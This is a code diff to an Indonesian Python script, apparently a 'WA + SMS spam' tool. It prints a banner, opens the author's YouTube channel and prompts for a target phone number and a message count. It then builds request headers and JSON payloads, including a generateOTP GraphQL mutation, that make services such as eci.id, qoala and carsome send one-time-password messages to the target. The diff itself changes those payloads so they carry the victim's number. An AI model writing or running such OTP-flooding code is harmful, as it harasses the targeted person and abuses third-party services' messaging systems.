@@ -9,7 +9,7 @@ def mengetik(c):
        for e in c + "\n":
           sys.stdout.write(e)
           sys.stdout.flush()
-          time.sleep(0.03)
+          time.sleep(0.01)
 
 #warna liat
 P = '\x1b[1;97m' # PUTIH
@@ -23,8 +23,10 @@ N = '\x1b[0m'    # WARNA MATI
 
 # program
 os.system( 'clear' )
-mengetik(f"{K}WELCOME TO MY SCRIPT"
-mengetik(f"{M}SUBCRIBE DULU CHANEL GUA BRO..")
+mengetik(f"{M}################################################")
+mengetik(f"{K}         •••••WELCOME TO MY SCRIPT•••••")
+mengetik(f"{O}     •••••SUBCRIBE DULU CHANEL GUA BRO•••••")
+mengetik(f"{M}################################################")
 time.sleep(3)
 os.system( 'clear' )
 os.system("xdg-open https://youtube.com/@riskimbmbg276")
@@ -55,7 +57,7 @@ mengetik(f"{H} ∎∎∎∎∎∎  L  ∎∎∎∎∎∎∎∎∎∎  ∎∎∎�
 mengetik(f"{H} ∎∎∎∎∎∎∎     ∎∎∎∎∎∎∎∎∎       ∎∎∎       ∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎  B  ∎∎∎∎∎∎∎∎  ∎  ∎∎∎∎∎∎∎∎∎  ∎∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎  A  ∎∎∎∎∎∎∎  ∎∎  ∎∎∎∎∎∎  ∎∎∎∎∎∎∎∎∎")
-mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎  H  ∎∎∎∎∎∎  ∎∎∎  ∎∎∎      ∎∎∎∎∎∎∎")
+mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎  H  ∎∎∎∎∎∎  ∎∎∎  ∎∎∎       ∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎∎  A  ∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎∎∎  N  ∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 print("")
@@ -79,7 +81,7 @@ mengetik(f"{H}          SCRIPT SPAM WA + SMS 2022")
 print("")
 mengetik(f"{H}____________________________________________")
 print("")
-mengetik(f"{P} [✓] Contoh Nomer Wa 8123456789")
+mengetik(f"{U} [✓] Contoh Nomer Wa 8123456789")
 mengetik(f"{M} [✘] Dilarang Menggunakan +62/08/62")
 time.sleep(2)
 mengetik(f"{H}____________________________________________")
@@ -89,8 +91,6 @@ print("")
 k = 0
 nomer = input(f"{O} ∎--> Nomer Target : ")
 jumlah = int(input(f"{O} ∎--> Spam Yang Ngotak! : "))
-print("WA / SMS")
-jenis = input("Jenis Spam : ")
 # headers
 headers_eci = {
 "Host" : "eci.id",
@@ -98,7 +98,7 @@ headers_eci = {
 "Content-Length" : "27",
 "Accept" : "application/json, text/plain, */*",
 "Origin" : "https://eci.id",
-"User-Agent" : "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
+"User-Agent" : "Mozilla/5.0 (Linux; Android 12.5.9; Redmi 9T Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
 "Content-Type" : "application/json",
 "Referer" : "https://eci.id/register",
 "Accept-Encoding" : "gzip, deflate, br",
@@ -150,8 +150,8 @@ headers_carsome = {
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 # Data
-data_eci = json.dumps({"identity":jenis})
-data_qoala = json.dumps({"channel":jenis})
+data_eci = json.dumps({"identity":"0"+nomer})
+data_qoala = json.dumps({"channel":"+62"+nomer})
 data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
 data_carsome = json.dumps({"username":nomer,"optType":1})
 
